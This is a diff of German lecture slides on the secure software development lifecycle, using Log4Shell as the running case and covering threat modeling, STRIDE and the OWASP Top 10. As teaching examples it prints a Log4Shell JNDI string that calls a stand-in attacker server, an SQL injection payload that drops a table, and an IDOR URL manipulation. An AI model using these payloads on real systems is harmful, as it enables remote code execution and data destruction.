@@ -1,4 +1,4 @@
-﻿---
+---
 marp: true
 theme: custom
 footer: ![w:280](img/dhbw-ka.svg)
@@ -11,15 +11,81 @@ footer: ![w:280](img/dhbw-ka.svg)
 
 # Agenda
 
-1. **Grundlagen:** SDLC → SSDLC, Shift Left
-2. **Motivation:** Exkurs Apple GotoFail
+1. **Eröffnung:** Der Tag, an dem das Internet brannte – Log4Shell
+2. **Grundlagen:** Vom SDLC zum SSDLC, Shift Left
 3. **Planung:** Security Requirements, Abuse Cases, Compliance
 4. **Design:** Security by Design, Threat Modeling, STRIDE
 5. **Implementierung:** OWASP Top 10, Injection, XSS, Secrets
-6. **Testing:** SAST, DAST, SCA, Code Review, Fuzzing, Pen-Test
-7. **Deployment & Betrieb:** Container-Hardening, DevSecOps
-8. **Governance:** OWASP SAMM, Frameworks im Vergleich
-9. **Fallstudien:** Log4Shell & Supply Chain Angriffe
+6. **Testing:** SAST, DAST, SCA, Code Review, Fuzzing
+7. **Supply Chain:** Angriffsflächen & Software Bill of Materials (SBOM)
+8. **DevSecOps:** CI/CD-Integration & Security Gates
+9. **Deep Dive:** Log4Shell – Technischer Mechanismus
+10. **Zusammenfassung & Diskussion**
+
+---
+<!-- _class: chapter -->
+
+# Der Tag, an dem das Internet brannte
+
+## Log4Shell – Dezember 2021
+
+---
+
+# 9. Dezember 2021
+
+- Ein Sicherheitsforscher veröffentlicht Details zu **CVE-2021-44228**.
+- **Betroffene Software:** Apache Log4j – eine Java-Logging-Bibliothek.
+- **CVSS-Score:** **10.0** – das absolute Maximum.
+- **Art:** Remote Code Execution (RCE) – beliebigen Code auf fremden Servern ausführen.
+
+Innerhalb von **Stunden** beginnen automatisierte Scans das gesamte Internet abzusuchen.
+
+> Die Schwachstelle wird schnell als **"Log4Shell"** bekannt.
+
+---
+
+# Warum war das so dramatisch?
+
+Log4j ist keine exotische Nischensoftware, sondern eine **Grundkomponente der Java-Welt**:
+
+- **Apple iCloud** – Millionen von Nutzerkonten
+- **Amazon AWS** – Cloud-Infrastruktur für Millionen Unternehmen
+- **Minecraft** – 140 Millionen aktive Spieler
+- **Tesla** – Fahrzeugsoftware
+- **Cisco, VMware, Twitter, LinkedIn** – Enterprise-IT weltweit
+
+**Das Kernproblem:** Die meisten Unternehmen wussten nicht einmal, dass sie Log4j nutzen. Die Bibliothek steckte als *transitive Abhängigkeit* tief in ihren Software-Stacks.
+
+---
+
+# Der "Magic String"
+
+Ein Angreifer musste lediglich folgenden Text an eine verwundbare Anwendung senden:
+
+```
+${jndi:ldap://angreifer-server.com/exploit}
+```
+
+- Eingefügt in ein **Login-Feld**, einen **Suchbegriff**, einen **HTTP-Header** – überall, wo die Eingabe geloggt wird.
+- Log4j interpretiert den String, kontaktiert den Server des Angreifers und **führt dessen Code aus**.
+
+> **Eine einzige Zeile Text** genügte, um einen Server vollständig zu kompromittieren.
+
+---
+
+# Die zentrale Frage
+
+<style scoped>
+blockquote { font-size: 1.4em; margin-top: 60px; }
+</style>
+
+> **"Warum wussten die meisten Unternehmen nicht einmal, dass sie Log4j verwenden – und wie hätte man das verhindern können?"**
+
+Die Antwort auf diese Frage führt uns durch die gesamte heutige Vorlesung:
+
+- Wir brauchen **Transparenz** über unsere Software-Bestandteile (→ SBOM).
+- Wir brauchen **Systematik** in jeder Entwicklungsphase (→ SSDLC).
+- Wir brauchen **Automatisierung** statt Hoffnung (→ DevSecOps).
 
 ---
 <!-- _class: chapter -->
@@ -30,22 +96,49 @@ footer: ![w:280](img/dhbw-ka.svg)
 
 ---
 
-# **S**oftware **D**evelopment **L**ife**C**ycle
+# Der klassische Software Development Lifecycle
 
 <style scoped>
-p { text-align: center; padding-top: 50px  }
+p { text-align: center; padding-top: 50px; }
 </style>
-![w:500](img/sdlc.svg)
+
+![w:1200](img/sdlc.svg)
 
 ---
 
-# Was ist der SSDLC? (Definition)
+# Wo steckt die Sicherheit?
 
-- **Traditionell:** Sicherheit ist ein "Check" am Ende (Penetration Test kurz vor Release).
-- **SSDLC:** Ein Framework, das Sicherheitsaktivitäten in **jede Phase** des SDLC integriert.
-- **Kernaspekt:** Es geht nicht nur um Tools, sondern um **Kultur, Prozesse und Leute**.
+Im klassischen SDLC wird Sicherheit typischerweise **am Ende** adressiert:
 
-> **Ziel:** Minimierung von Schwachstellen bei gleichzeitiger Beschleunigung der Entwicklung.
+- Ein **Penetration Test** kurz vor dem Release.
+- Eine **Security Review** als letzter Gate-Keeper.
+- **Ergebnis:** Schwachstellen werden spät entdeckt, Fixes sind teuer und riskant.
+
+**Das Problem:**
+- Architektur-Fehler lassen sich nachträglich kaum beheben.
+- Zeitdruck vor dem Release führt zu "Akzeptiertem Risiko".
+- Sicherheit wird als **Bremse** wahrgenommen, nicht als Qualitätsmerkmal.
+
+---
+
+# Das "Shift Left" Prinzip
+## Die Ökonomie der Sicherheit
+
+
+![w:580 center](img/shift_left_cost.svg)
+
+**Fazit:** Sicherheit früh zu adressieren ist keine "Bremse", sondern eine Versicherungsprämie mit extrem hohem ROI.
+
+---
+
+# Was ist der SSDLC?
+
+- **Definition:** Ein Framework, das Sicherheitsaktivitäten in **jede Phase** des SDLC integriert.
+- **Kernaspekt:** Es geht nicht nur um Tools, sondern um **Kultur, Prozesse und Menschen**.
+- **Ziel:** Schwachstellen systematisch reduzieren – von den Anforderungen bis zum Betrieb.
+
+> **Traditionell:** Sicherheit als Checkpoint am Ende.
+> **SSDLC:** Sicherheit als durchgängiger Begleiter.
 
 ---
 
@@ -57,112 +150,19 @@ Jede Phase des Entwicklungsprozesses hat dedizierte Security-Aktivitäten:
 
 ---
 
-# Das "Shift Left" Prinzip
-## Die Ökonomie der Sicherheit
+# Rückbezug: Log4Shell & Shift Left
 
-Je später ein Fehler entdeckt wird, desto teurer ist seine Behebung.
+Hätte man Log4Shell in verschiedenen Phasen adressiert:
 
-![w:620 center](img/shift_left_cost.svg)
+| Phase | Mögliche Maßnahme | Kosten |
+| :--- | :--- | :--- |
+| **Requirements** | "Logging darf keinen Remote Code ausführen" | Minimal |
+| **Design** | Trust Boundary zwischen Logger und Netzwerk | Gering |
+| **Implementierung** | JNDI-Lookups standardmäßig deaktivieren | Moderat |
+| **Testing (SCA)** | Verwundbare Log4j-Version erkennen | Moderat |
+| **Produktion** | WAF-Regel, Incident Response, Patch | **Sehr hoch** |
 
-**Fazit:** Sicherheit früh zu adressieren ist keine "Bremse", sondern eine Versicherungsprämie mit extrem hohem ROI.
-
----
-<!-- _class: chapter -->
-
-# Exkurs: Apple GotoFail
-
-## Wenn eine einzige Zeile Code alles bricht
-
----
-
-# Exkurs: Apple GotoFail
-
-## Was ist passiert?
-
-Im Februar 2014 entdeckten Sicherheitsforscher eine klaffende Lücke in Apples SSL/TLS-Implementierung.
-
-- **Betroffene Systeme:** iOS 6 & 7, Mac OS X Mavericks (10.9).
-- **Die Schwachstelle:** Eine fehlerhafte Zertifikatsvalidierung in der Library `SecureTransport`.
-- **Das Resultat:** "Verschlüsselte" Verbindungen waren für Angreifer komplett offen.
-
----
-
-# Der Code
-
-```c
-SSLVerifySignedServerKeyExchange(SSLContext *ctx, bool isRsa, 
-                                 SSLBuffer signedParams, uint8_t *signature, 
-                                 UInt16 signatureLen)
-{
-    OSStatus err;
-    ...
-    if ((err = SSLHashSHA1.update(&hashCtx, &serverRandom)) != 0)
-        goto fail;
-    if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)
-        goto fail;
-        goto fail; // <--- DER ÜBELTÄTER
-    if ((err = SSLHashSHA1.final(&hashCtx, &hashOut)) != 0)
-        goto fail;
-    ...
-fail:
-    return err;
-}
-```
-
----
-
-# Die Anatomie des Fehlers
-
-Ohne geschweifte Klammern `{ }` bezieht sich ein `if` nur auf die **nächste** Zeile.
-
-- **Der unbedingte Sprung:** Die zweite `goto fail;` Zeile wird **immer** ausgeführt, unabhängig vom Ergebnis der `if`-Abfrage davor.
-- **Status "Erfolg":** Da die vorherige Operation erfolgreich war, steht die Variable `err` auf `0` (noErr).
-- **Der Bypass:** Die kritische Funktion `SSLHashSHA1.final`, die prüft, ob der private Schlüssel des Servers zum Zertifikat passt, wird einfach übersprungen.
-- **Das Resultat:** Die Funktion gibt "Erfolg" zurück, obwohl die Authentizität nie verifiziert wurde.
-
----
-
-# Die fatalen Auswirkungen
-
-- **Man-in-the-Middle (MITM):** In jedem öffentlichen WLAN (Café, Hotel, Flughafen) konnten Angreifer den gesamten verschlüsselten Datenverkehr mitlesen.
-- **Vorgetäuschte Sicherheit:** Safari zeigte das "grüne Schloss" an, obwohl die Identität des Servers nicht bestätigt war.
-- **Betroffene Daten:** 
-    - Anmeldedaten für E-Mails und soziale Netzwerke.
-    - Online-Banking-Informationen.
-    - iCloud-Backups und private Fotos.
-- **Zeitraum:** Die Lücke war über Monate in iOS und OS X präsent, bevor der Patch veröffentlicht wurde.
-
----
-
-# Warum wurde der Fehler nicht entdeckt?
-
-Es war ein perfektes Zusammenspiel aus menschlichem Versagen und Prozesslücken.
-
-- **Visuelle Täuschung:** Menschen lesen Code oft anhand von Einrückungen. Die Einrückung suggeriert eine Logik, die für den Compiler nicht existiert.
-- **Fehlende "Negative Tests":** Die Test-Suiten prüften vermutlich nur, ob gültige Zertifikate funktionieren. Es fehlte ein automatisierter Test, der sicherstellt, dass ein **ungültiges** Zertifikat abgelehnt wird.
-- **Compiler-Warnungen:** Ein moderner Compiler erkennt "Dead Code" (Code, der niemals erreicht wird). Die Zeilen nach dem Fehler waren technisch gesehen unerreichbar. Diese Warnungen wurden entweder ignoriert oder waren in der Build-Umgebung deaktiviert.
-
----
-
-# Was haben wir daraus gelernt?
-
-Der "goto fail"-Bug wurde zum Standardbeispiel für **Defensive Programming**.
-
-- **Die "Golden Rule" der Brackets:** Verwende *immer* geschweifte Klammern `{ }`, auch wenn das `if`-Statement nur eine einzige Zeile umfasst. 
-- **Static Analysis Tools:**
-    Moderne Compiler und Linter erkennen "Unreachable Code" sofort. In einer professionellen CI/CD-Pipeline darf Code mit solchen Warnungen niemals gemergt werden.
-- **Code Review Kultur:**
-    Reviews dürfen keine reine Formsache sein. Ein "Diff" in der Versionskontrolle hätte die doppelte Zeile deutlich gezeigt – sofern man nicht nur die Einrückung überflogen hätte.
-
----
-
-# Fazit & Takeaway
-
-- **Sicherheit ist fragil:** Ein einziger Copy-Paste-Fehler in Millionen Zeilen Code kann die gesamte Kryptographie einer Plattform wertlos machen.
-- **Tools vor Intuition:** Wir können uns nicht auf das menschliche Auge verlassen. Automatisierte Tests und statische Analysen sind das einzige Sicherheitsnetz.
-- **Transparenz:** Apple wurde damals scharf für die verzögerte Kommunikation kritisiert. Schnelle Patches und offene Kommunikation sind Teil der Sicherheit.
-
-> **Brücke zum SSDLC:** Hätte Apple einen robusten SSDLC gehabt – mit SAST, Code Reviews und negativen Tests – wäre dieser Bug nie in Produktion gelandet.
+> Je früher die Maßnahme, desto günstiger und effektiver.
 
 ---
 <!-- _class: chapter -->
@@ -173,72 +173,91 @@ Der "goto fail"-Bug wurde zum Standardbeispiel für **Defensive Programming**.
 
 ---
 
-# Phasen des SSDLC: Planung & Requirements
+# Security Requirements
 
-## Über funktionale Anforderungen hinaus
-- **Security Requirements:** Definition von Sicherheitszielen (Vertraulichkeit, Verfügbarkeit).
-- **Compliance:** Berücksichtigung von Standards (DSGVO, ISO 27001, PCI-DSS).
-- **Abuse Cases:** 
-    - **Functional:** "Nutzer klickt auf 'Bezahlen'."
-    - **Abuse:** "Angreifer sendet negativen Betrag beim Bezahlen."
-- **Definition of Done (DoD):** Feature ist erst fertig, wenn Security-Scans "grün" sind.
+Funktionale Anforderungen beschreiben, was das System **tun soll**. Security Requirements beschreiben, was es **nicht tun darf**.
 
----
+- **Vertraulichkeit:** "Passwörter dürfen nur als Hash gespeichert werden."
+- **Integrität:** "Transaktionsbeträge müssen serverseitig validiert werden."
+- **Verfügbarkeit:** "Das System muss 99,9% Uptime gewährleisten."
+- **Compliance:** DSGVO, ISO 27001, PCI-DSS – je nach Branche und Datenart.
 
-# Compliance & Regulatorik: Der rechtliche Rahmen
-
-Security ist oft keine Option, sondern eine gesetzliche Pflicht. In der Requirements-Phase müssen folgende Faktoren geklärt werden:
-
-| Standard | Fokus | Relevanz für SSDLC |
-| :--- | :--- | :--- |
-| **DSGVO** | Datenschutz (EU) | Privacy by Design, Löschkonzepte. |
-| **ISO 27001** | ISMS | Prozesssicherheit & Dokumentation. |
-| **PCI-DSS** | Zahlungsverkehr | Strikte Isolation von Kreditkartendaten. |
-| **SOC2** | Service Organisation | Nachweis von Kontrollmechanismen. |
-
-> **Merke:** Compliance-Verstöße sind oft teurer als die Implementierung der Sicherheitsmaßnahmen selbst.
+> **Merke:** Was nicht in den Anforderungen steht, wird nicht implementiert.
 
 ---
 
-# Abuse Cases vs. Use Cases
+# Abuse Cases: Denken wie ein Angreifer
+<!-- _class: big -->
+Während ein **Use Case** beschreibt, wie ein System genutzt werden *soll*, beschreibt ein **Abuse Case** das bewusste Fehlverhalten.
 
-Während ein **Use Case** beschreibt, wie ein System genutzt werden *soll*, beschreibt ein **Abuse Case** das bewusste Fehlverhalten aus Sicht eines Angreifers.
+**Vorgehen:**
+1. Für jedes Feature fragen: *"Was könnte ein Angreifer damit tun?"*
+2. Bedrohungsszenario formulieren: *"Als Angreifer möchte ich..."*
+3. Gegenmaßnahme als Anforderung definieren.
 
-**Vorgehen zur Erstellung:**
-1. **Brainstorming:** Was könnte ein böswilliger Akteur mit dieser Funktion tun?
-2. **Bedrohungsszenario:** "Als Angreifer möchte ich die SQL-Datenbank auslesen, indem ich Schadcode in das Login-Feld injiziere."
-3. **Countermeasure:** Definition einer Anforderung zur Input-Validierung.
+---
 
-**Beispiel für eine Zahlungsfunktion:**
+# Abuse Cases: Denken wie ein Angreifer
 
 | Use Case | Abuse Case | Gegenmaßnahme |
 | :--- | :--- | :--- |
 | Nutzer bezahlt 49,99 € | Angreifer sendet -49,99 € | Serverseitige Validierung: Betrag > 0 |
 | Nutzer gibt Gutscheincode ein | Brute-Force aller Codes | Rate Limiting, CAPTCHA |
+| Nutzer loggt sich ein | Credential Stuffing | MFA, Account-Lockout |
 
 ---
+<!-- _class: big -->
+# Risikoklassifizierung & Security Gates
 
-# Risiko-Einstufung in der Planung
+Nicht jedes Feature braucht das gleiche Maß an Security-Aufwand:
 
-Nicht jedes Feature benötigt das gleiche Maß an Security-Aufwand. In der Planungsphase erfolgt die **Klassifizierung**:
-
-- **High Risk:** Features mit Internet-Exposition, Zahlungsabwicklung oder Zugriff auf PII (Personenbezogene Daten).
+- **High Risk:** Internet-Exposition, Zahlungsabwicklung, personenbezogene Daten (PII).
 - **Medium Risk:** Interne Tools mit eingeschränktem Nutzerkreis.
 - **Low Risk:** Statische Inhalte ohne Nutzereingaben.
 
-**Konsequenz:** Die Risiko-Einstufung bestimmt die Tiefe der Security-Tests und die Priorisierung der Anforderungen.
+---
+<!-- _class: big -->
+# Risikoklassifizierung & Security Gates
+
+**Security Definition of Done – Checkliste:**
+- Statische Analyse (SAST): Code gescannt, keine "High"-Findings offen.
+- Abhängigkeiten (SCA): Alle Libraries auf sicherem Stand.
+- Threat Model für das Feature aktualisiert.
+- Peer Review mit explizitem Security-Fokus durchgeführt.
 
 ---
 
-# Definition of Done (DoD) & Security Gates
+# Compliance & Regulatorik
 
-Security darf kein "Nachtrag" am Ende des Projekts sein. Sie muss integraler Bestandteil der Abnahmekriterien sein.
+Security ist oft keine Option, sondern eine **gesetzliche Pflicht**:
 
-**Beispielhafte Security-DoD-Checkliste:**
-- **Statische Analyse (SAST):** Code wurde gescannt, keine "High"-Vulnerabilities offen.
-- **Abhängigkeiten (SCA):** Alle genutzten Libraries sind auf einem sicheren Stand.
-- **Threat Model:** Die Bedrohungsanalyse für das Feature wurde aktualisiert.
-- **Peer Review:** Ein zweiter Entwickler hat den Code explizit auf Security-Flaws geprüft.
+<style scoped>
+table { font-size: 0.85em; }
+</style>
+
+| Standard | Fokus | Relevanz für SSDLC |
+| :--- | :--- | :--- |
+| **DSGVO** | Datenschutz (EU) | Privacy by Design, Löschkonzepte |
+| **ISO 27001** | ISMS | Prozesssicherheit & Dokumentation |
+| **PCI-DSS** | Zahlungsverkehr | Strikte Isolation von Kreditkartendaten |
+| **NIS-2** | Kritische Infrastruktur (EU) | Meldepflichten, Supply-Chain-Sicherheit |
+| **EU CRA** | Cyber Resilience Act | SBOM-Pflicht für Produkte mit digitalen Elementen |
+
+> Compliance-Verstöße sind oft teurer als die Implementierung der Sicherheitsmaßnahmen.
+
+---
+
+# Rückbezug: Log4Shell & Requirements
+
+**Welche Anforderung hätte Log4Shell verhindern können?**
+
+- *"Die Logging-Komponente darf keine Netzwerkverbindungen zu externen Servern aufbauen."*
+- *"Dynamische Auswertung von Log-Nachrichten (Lookups) ist standardmäßig deaktiviert."*
+- *"Alle Drittanbieter-Bibliotheken müssen in einer SBOM erfasst und regelmäßig auf bekannte Schwachstellen geprüft werden."*
+
+Diese Anforderungen existierten in keiner der betroffenen Organisationen.
+
+> **Lektion:** Ohne explizite Security Requirements bleibt Sicherheit dem Zufall überlassen.
 
 ---
 <!-- _class: chapter -->
@@ -252,82 +271,77 @@ Security darf kein "Nachtrag" am Ende des Projekts sein. Sie muss integraler Bes
 # Security by Design Prinzipien
 
 - **Least Privilege:** Komponenten haben nur die minimal nötigen Rechte.
-- **Defense in Depth:** Mehrstufige Verteidigung (nicht nur eine Firewall).
+- **Defense in Depth:** Mehrstufige Verteidigung – nicht nur eine Firewall.
 - **Secure Defaults:** Standardmäßig ist alles "zu", Funktionen müssen explizit aktiviert werden.
 - **Fail Securely:** Wenn ein System abstürzt, darf es keine Backdoors öffnen.
 - **Separation of Concerns:** Trennung von Authentifizierung, Autorisierung und Geschäftslogik.
 - **Zero Trust:** Keiner Komponente vertrauen – auch nicht internen Diensten.
 
+> **Log4Shell-Bezug:** Log4j verletzte "Secure Defaults" – JNDI-Lookups waren *standardmäßig aktiviert*.
+
 ---
 
 # Threat Modeling
 
-**Wann führen wir es durch?**
-Immer wenn sich die Architektur ändert. Es ist die "Prüfung der Blaupause".
+**Wann?** Immer wenn sich die Architektur ändert. Es ist die "Prüfung der Blaupause".
 
 **Die 4 Kernfragen:**
-1. Was bauen wir? (Diagramm erstellen)
-2. Was kann schiefgehen? (Bedrohungen identifizieren)
-3. Was tun wir dagegen? (Maßnahmen planen)
-4. War das gut so? (Validierung)
+1. **Was bauen wir?** → Diagramm erstellen (DFD)
+2. **Was kann schiefgehen?** → Bedrohungen identifizieren (STRIDE)
+3. **Was tun wir dagegen?** → Maßnahmen planen
+4. **War das gut so?** → Validierung
+
+**Tools:**
+- **Microsoft Threat Modeling Tool:** Generiert automatisch STRIDE-Bedrohungen.
+- **OWASP Threat Dragon:** Open Source, webbasiert.
+- **draw.io / Excalidraw:** Flexibel für individuelle Diagramme.
 
 ---
 
 # Datenflussdiagramme (DFD)
 
 Um Bedrohungen zu finden, nutzen wir Abstraktionen:
-- **Prozesse (Kreise):** Programmlogik, Cloud-Functions.
-- **Datenspeicher (Parallele Linien):** DBs, S3-Buckets, Caches.
-- **Externe Entitäten (Rechtecke):** Enduser, Drittanbieter-APIs.
-- **Trust Boundaries (Gepunktete Linien):** Der wichtigste Teil! Hier kreuzen Daten eine Vertrauenszone.
 
-> Dies sind die kritischen Chokepoints für Input-Validierung und Authentifizierung.
+- **Prozesse** (Kreise): Programmlogik, Cloud Functions.
+- **Datenspeicher** (Parallele Linien): Datenbanken, S3-Buckets, Caches.
+- **Externe Entitäten** (Rechtecke): Enduser, Drittanbieter-APIs.
+- **Trust Boundaries** (Gepunktete Linien): Hier kreuzen Daten eine Vertrauenszone.
+
+> Trust Boundaries sind die kritischen **Chokepoints** für Input-Validierung und Authentifizierung.
 
 ---
 
 # DFD-Beispiel: Login-System
 
-![w:680 center](img/dfd_login_example.svg)
+![w:820 center](img/dfd_login_example.svg)
 
 ---
 
-# STRIDE & Gegenmaßnahmen
+# STRIDE – Systematische Bedrohungsanalyse
 
 | Bedrohung | Schutzziel | Beispiel-Maßnahme |
 | :--- | :--- | :--- |
 | **S**poofing | Authentizität | MFA, TLS-Zertifikate |
 | **T**ampering | Integrität | Digitale Signaturen, Hashes |
 | **R**epudiation | Verbindlichkeit | Sicheres Logging, Audit-Trails |
-| **I**nformation Disc. | Vertraulichkeit | Verschlüsselung (AES), TLS |
+| **I**nformation Disclosure | Vertraulichkeit | Verschlüsselung (AES), TLS |
 | **D**enial of Service | Verfügbarkeit | Rate Limiting, Redundanz |
-| **E**levation of Priv. | Autorisierung | RBAC, Role-Validation |
+| **E**levation of Privilege | Autorisierung | RBAC, Role-Validation |
 
 ---
 
-# STRIDE am Beispiel Login-System
+# STRIDE am Beispiel: Logging-Subsystem
 
-- **S (Spoofing):** Jemand klaut ein Passwort $\rightarrow$ WebAuthn / Passkeys.
-- **T (Tampering):** Ändern der User-ID im POST-Body $\rightarrow$ Server-side Session Mgmt.
-- **R (Repudiation):** Admin löscht Logs seiner Aktionen $\rightarrow$ Read-only Logs extern.
-- **I (Information Disc.):** Server verrät "Passwort falsch" statt "Login fehlgeschlagen" $\rightarrow$ User Enumeration.
-- **D (DoS):** Brute-Force legt Server lahm $\rightarrow$ Captchas / IP-Blocking.
-- **E (Privilege):** Angreifer wird Admin durch Cookie-Manipulation $\rightarrow$ HMAC-Schutz.
+Was passiert, wenn wir STRIDE auf **das Logging-System** anwenden – genau die Komponente, die bei Log4Shell versagte?
 
----
+- **S:** Angreifer fälscht Log-Einträge, um Spuren zu verwischen.
+- **T:** Manipulation von Log-Dateien, um Audit-Trails zu verfälschen.
+- **R:** Fehlende Logs → Aktionen nicht nachvollziehbar.
+- **I:** Sensitive Daten landen im Klartext in Log-Dateien (Passwörter, Tokens).
+- **D:** Log-Flooding macht das SIEM unbrauchbar.
+- **E:** **Log-Nachrichten lösen Code-Ausführung aus** → genau das ist Log4Shell!
 
-# Threat Modeling in der Praxis
-
-Threat Modeling ist kein einmaliges Event, sondern ein **lebendes Dokument**.
-
-**Tools:**
-- **Microsoft Threat Modeling Tool:** Erstellt DFDs, generiert automatisch STRIDE-Bedrohungen.
-- **OWASP Threat Dragon:** Open Source, webbasiert, gut für agile Teams.
-- **draw.io / Excalidraw:** Flexibel für individuelle Diagramme.
-
-**Prozess-Integration:**
-- Bei jedem **Architektur-Change** aktualisieren.
-- Im **Sprint Planning** für neue Features einplanen (30–60 min).
-- **Output:** Dokumentiertes Threat Model mit priorisierten Risiken und Maßnahmen.
+> Hätte jemand STRIDE auf die Logging-Architektur angewendet, wäre "E" (Elevation of Privilege) sofort aufgefallen.
 
 ---
 <!-- _class: chapter -->
@@ -338,233 +352,162 @@ Threat Modeling ist kein einmaliges Event, sondern ein **lebendes Dokument**.
 
 ---
 
-# Was ist OWASP?
+# OWASP Top 10
 
-- **Open Web Application Security Project**
-- Eine weltweit aktive Non-Profit-Organisation.
-- **Ziel:** Die Sicherheit von Software messbar und sichtbar machen.
-- **Die Top 10:** Basieren auf der Analyse von Tausenden Anwendungen und Millionen von Schwachstellen (CWEs).
-- Gilt als Industriestandard für Compliance und Pentesting.
+Die OWSAP ist eine gemeinnützige Organisation, die sich der Verbesserung der Software-Sicherheit verschrieben hat. Ihre **Top 10** ist eine Liste der häufigsten und kritischsten Sicherheitsrisiken in Webanwendungen.
+
+**Warum die OWASP Top 10 für den SSDLC essentiell ist:**
+
+- Sie dienen als **Standard-Bedrohungsmodell** in der Designphase.
+- Sie leiten **Anforderungen** in der Planungsphase ab.
+- Sie bestimmen **Testfälle** in der Testing-Phase.
+- Sie bilden die Grundlage für **Schulungsprogramme** und Security-Awareness.
+
+> **Merke:** Jeder Entwickler sollte die OWASP Top 10 auswendig kennen – genauso wie "Null-Pointer Exceptions" oder "SQL Syntax" Teil des Handwerkszeugs sind.
+
 
 ---
 
-# Die aktuelle Liste: OWASP Top 10 (2021)
+# OWASP Top 10 
+
+<style scoped>
+table { font-size: 0.75em;}
+</style>
 
 | # | Kategorie | Kurzbeschreibung |
 | :--- | :--- | :--- |
-| A01 | **Broken Access Control** | Fehlende oder unzureichende Zugriffskontrollen |
+| A01 | **Broken Access Control** | Fehlende Zugriffskontrollen |
 | A02 | **Cryptographic Failures** | Schwache oder fehlende Verschlüsselung |
 | A03 | **Injection** | SQL, XSS, Command Injection |
 | A04 | **Insecure Design** | Architektur-Schwächen, fehlende Threat Models |
-| A05 | **Security Misconfiguration** | Default-Passwörter, offene Ports, verbose Errors |
-| A06 | **Vulnerable Components** | Bekannte Schwachstellen in Libraries |
+| A05 | **Security Misconfiguration** | Default-Passwörter, offene Ports |
+| A06 | **Vulnerable Components** | Bekannte CVEs in Libraries |
 | A07 | **Auth. Failures** | Schwache Passwörter, Session-Fehler |
-| A08 | **Data Integrity Failures** | Unsichere Deserialisierung, fehlende Signierung |
-| A09 | **Logging Failures** | Fehlende Erkennung von Angriffen |
+| A08 | **Data Integrity Failures** | Unsichere Deserialisierung |
+| A09 | **Logging Failures** | Fehlende Angriffserkennung |
 | A10 | **SSRF** | Server-Side Request Forgery |
 
 ---
 
 # A01: Broken Access Control
-## Was ist das?
 
-- Nutzer können auf Funktionen oder Daten zugreifen, für die sie keine Berechtigung haben.
-- Es fehlen serverseitige Prüfungen, ob der aktuelle User die Aktion wirklich ausführen darf.
-- **Folge:** Datenlecks, Manipulation von fremden Accounts oder Übernahme von Admin-Rechten.
+- Nutzer können auf Funktionen oder Daten zugreifen, für die sie **keine Berechtigung** haben.
+- Es fehlen serverseitige Prüfungen, ob der User die Aktion ausführen darf.
 
----
+**Beispiel: Insecure Direct Object Reference (IDOR)**
 
-# A01: Beispiel & Erklärung
+Ein User sieht sein Profil unter: `https://example.com/api/v1/users/1234`
 
-- **Szenario: Insecure Direct Object Reference (IDOR)**
-- Ein User loggt sich ein und sieht sein Profil unter:
-  `https://example.com/api/v1/users/1234`
-- Der Angreifer ändert die ID in der URL einfach auf:
-  `https://example.com/api/v1/users/1235`
-- **Erklärung:** Wenn der Server nur prüft, ob der User *eingeloggt* ist, aber nicht, ob ihm die ID `1235` gehört, kann er fremde Daten auslesen.
-- **Lösung:** "Deny by default" und konsequente Prüfung der Ownership auf dem Server.
+Der Angreifer ändert die ID: `https://example.com/api/v1/users/1235`
+
+Wenn der Server nur prüft, ob der User *eingeloggt* ist, aber nicht, ob ihm die ID `1235` gehört → **Datenleck**.
+
+**Lösung:** "Deny by default" + konsequente Ownership-Prüfung auf dem Server.
 
 ---
 
-# A03: Injection
-## Was ist das?
+# A03: Injection – SQL Injection
 
-- Nicht vertrauenswürdige Daten werden an einen Interpreter gesendet.
-- Der Interpreter (z. B. SQL, Betriebssystem-Shell) kann die Daten nicht von den eigentlichen Befehlen unterscheiden.
-- **Folge:** Der Angreifer kann eigene Befehle im Kontext der Anwendung ausführen.
+Nicht vertrauenswürdige Daten werden an einen Interpreter gesendet. Der Interpreter kann **Daten nicht von Befehlen unterscheiden**.
 
----
-# SQL Injection (SQLi)
-## Warum ist das so gefährlich?
+**Verwundbarer Code:**
+```
+"SELECT * FROM products WHERE id = " + request.id
+```
 
-- **Definition:** Einschleusen von Datenbankbefehlen über Eingabefelder oder Parameter.
-- **Ziel:** Umgehung von Logins, Auslesen sensibler Daten (Passwörter, Kreditkarten) oder das Löschen ganzer Tabellen (`DROP TABLE`).
-- **Ursache:** Die Vermischung von **Daten** (User-Input) und **Befehl** (SQL-Logik) im selben String.
+**Normaler Aufruf:** `id = 10`
+→ `SELECT * FROM products WHERE id = 10` ✅
 
----
-
-# Wie funktioniert es im Detail?
-
-Stell dir vor, der Server baut folgenden String:
-`"SELECT * FROM products WHERE id = " + request.id`
-
-1. **Normaler Aufruf:** `id = 10` 
-   -> `SELECT * FROM products WHERE id = 10` (Sicher)
-2. **Angriff:** `id = 10; DROP TABLE users`
-   -> `SELECT * FROM products WHERE id = 10; DROP TABLE users` (Katastrophe)
-
-**Der Kern des Problems:** Die Datenbank "glaubt", dass der zweite Teil der Eingabe ein rechtmäßiger Befehl des Programmierers ist.
-
-**Varianten:**
-- **In-band (Classic):** Ergebnis direkt auf der Website sichtbar.
-- **Blind:** Angreifer stellt "Ja/Nein"-Fragen an die DB über Ladezeiten/Fehlermeldungen.
-- **Union-based:** `UNION`-Operator, um Daten aus anderen Tabellen einzuschmuggeln.
+**Angriff:** `id = 10; DROP TABLE users`
+→ `SELECT * FROM products WHERE id = 10; DROP TABLE users` ❌
 
 ---
 
-# Die wichtigste Gegenmaßnahme: 
-## Prepared Statements (Parameterisierte Abfragen)
+# Prepared Statements – Der Goldstandard
 
-Dies ist der **Goldstandard**. Hierbei wird die SQL-Struktur *vorher* an die DB gesendet und der User-Input nur noch als reiner Textwert (Parameter) nachgereicht.
+Die SQL-Struktur wird **vorher** an die Datenbank gesendet. Der User-Input wird nur noch als reiner Textwert nachgereicht:
 
-**Beispiel (Java/JDBC):**
 ```java
 // SICHER: Der Input wird niemals als Code ausgeführt
 String query = "SELECT * FROM users WHERE username = ?";
 PreparedStatement pstmt = connection.prepareStatement(query);
-pstmt.setString(1, userInput); 
+pstmt.setString(1, userInput);
 ResultSet results = pstmt.executeQuery();
 ```
 
----
-
-# Cross-Site Scripting (XSS)
-## Was ist das?
-
-- Angreifer schleust **JavaScript-Code** in eine Webseite ein, der im Browser anderer Nutzer ausgeführt wird.
-- Der Browser "vertraut" dem Code, weil er von der legitimen Website zu kommen scheint.
-- **Folge:** Session-Hijacking, Datendiebstahl, Phishing innerhalb der echten Anwendung.
+**Prinzip:** Strikte Trennung von **Befehlen** und **Daten**.
 
 ---
 
-# XSS: Die drei Varianten
+# A03: Cross-Site Scripting (XSS)
+
